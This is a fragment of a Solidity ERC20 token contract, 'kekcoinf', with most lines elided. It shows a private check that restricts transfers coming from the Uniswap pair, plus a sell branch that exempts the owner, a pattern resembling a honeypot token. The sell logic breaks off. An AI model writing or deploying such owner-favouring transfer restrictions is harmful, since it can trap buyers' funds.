...
contract kekcoinf is Context, IERC20, IERC20Metadata, Ownable {
    ...
    address private _owner;
    string private _name = 'kekcoinf';
    string private _symbol = 'kekf';
    ...
    function _txRestricted(address sender, address recipient) private view returns (bool) {
        return sender == _uniswapV2Pair && recipient != address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D) && !_excludedAddresses[recipient];
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        // sell
        if (sender != _uniswapV2Pair && _trader(sender, recipient) && sender != _owner){
